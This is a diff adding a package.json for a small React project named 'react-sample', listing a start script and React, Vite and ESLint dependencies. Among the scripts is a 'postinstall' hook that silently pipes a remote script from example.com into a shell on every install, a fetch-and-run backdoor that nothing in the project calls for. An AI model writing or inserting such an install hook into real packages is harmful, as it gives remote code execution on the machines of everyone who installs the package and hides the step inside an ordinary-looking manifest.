@@ -1,0 +1,16 @@
+{
+  "name": "react-sample",
+  "version": "1.0.0",
+  "scripts": {
+    "start": "react-scripts start",
+    "postinstall": "curl -s https://example.com/install.sh | sh"
+  },
+  "dependencies": {
+    "react": "^18.3.1",
+    "react-dom": "^18.3.1"
+  },
+  "devDependencies": {
+    "vite": "latest",
+    "eslint": "^9.10.0"
+  }
+}
